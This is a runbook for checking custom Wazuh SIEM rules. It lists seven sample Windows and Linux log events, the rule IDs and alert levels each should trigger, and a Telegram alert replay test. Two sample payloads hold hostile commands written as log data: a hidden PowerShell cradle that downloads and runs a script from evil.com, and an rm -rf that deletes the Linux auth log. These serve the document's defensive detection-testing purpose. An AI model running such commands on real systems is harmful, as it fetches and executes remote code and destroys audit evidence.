# Testing and Rule Verification Runbook for Wazuh SIEM

In compliance with enterprise security operations standards, all custom rules and decoders must be validated prior to production deployment using the native `wazuh-logtest` utility and pre-restart compiler tests.

---

## 1. Syntax Validation & Rule Compilation

Before restarting the Wazuh Manager, always verify rule and decoder syntax:
```bash
/var/ossec/bin/wazuh-analysisd -t
```
* **Expected Result:** Clean exit without output (Return code `0`).
* **If errors are found:** The compiler reports the exact file, line number, and offending XML tag (e.g. invalid `<mitre>` option or malformed closing tag).

---

## 2. Interactive Testing via `wazuh-logtest`

Launch the interactive rule evaluator on the Wazuh Manager host:
```bash
/var/ossec/bin/wazuh-logtest
```
Paste any test payload below to verify decoder extraction, rule ID match, and alert level assignment.

---

## 3. High-Priority Test Cases

### Test Case 1: Windows Security Audit Log Cleared (Event ID 1102)
* **Expected Result:** Triggers Rule `100010` (Level 14 - Critical, MITRE T1070.001) $\rightarrow$ Telegram alert dispatched.
* **Payload:**
```json
{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","eventID":"1102","computer":"DC01.corp.local"},"eventdata":{"subjectUserName":"Administrator","subjectDomainName":"CORP"}}}
```

---

### Test Case 2: Suspicious Obfuscated PowerShell Execution (Event ID 4104)
* **Expected Result:** Triggers Rule `100014` (Level 12 - High, MITRE T1059.001) $\rightarrow$ Telegram alert dispatched.
* **Payload:**
```json
{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","eventID":"4104","computer":"WS-02.corp.local"},"eventdata":{"scriptBlockText":"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX"}}}
```

---

### Test Case 3: User Added to Local Administrators (Event ID 4728 / 4732)
* **Expected Result:** Triggers Rule `100011` (Level 12 - High, MITRE T1098) $\rightarrow$ Telegram alert dispatched.
* **Payload:**
```json
{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","eventID":"4728","computer":"DC01.corp.local"},"eventdata":{"targetUserName":"Administrators","memberSid":"S-1-5-21-12345-67890-1001","subjectUserName":"admin_sec"}}}
```

---

### Test Case 4: Linux Audit Log Deletion Attempt
* **Expected Result:** Triggers Rule `100003` (Level 12 - High, MITRE T1070.002) $\rightarrow$ Telegram alert dispatched.
* **Payload:**
```text
Nov 19 10:15:30 srv-ubuntu bash[1234]: rm -rf /var/log/auth.log
```

---

### Test Case 5: Linux SSH Multi-Attempt Brute Force (Rule 2502)
* **Expected Result:** Triggers Rule `2502` (Level 10 - Warning, MITRE T1110) $\rightarrow$ Telegram alert dispatched.
* **Payload:**
```text
Nov 19 12:42:45 ntp.sbra.net sshd[28491]: Failed password for fakeuser from 10.100.68.1 port 54321 ssh2
```

---

### Test Case 6: Noise Suppression - Linux Cron Session Messages
* **Expected Result:** Triggers Rule `100022` (Level 0 - Ignored) $\rightarrow$ Silently dropped, zero Telegram alerts.
* **Payload:**
```text
Nov 19 10:17:01 srv-ubuntu CRON[5678]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
```

---

### Test Case 7: Noise Suppression - Windows Filtering Platform (Event ID 5156)
* **Expected Result:** Triggers Rule `100020` (Level 0 - Ignored) $\rightarrow$ Silently dropped, zero Telegram alerts.
* **Payload:**
```json
{"win":{"system":{"providerName":"Microsoft-Windows-Security-Auditing","eventID":"5156","computer":"WS-01.corp.local"},"eventdata":{"application":"C:\\Windows\\System32\\svchost.exe","destPort":"443"}}}
```

---

## 4. Standalone Telegram Integration Replay Test

To test the integration script directly against an existing alert without simulating an attack:
```bash
/var/ossec/integrations/custom-telegram /tmp/real_alert_2502.json
```
Check exit code (`echo $?` should return `0`) and verify message delivery in the target Telegram channel.
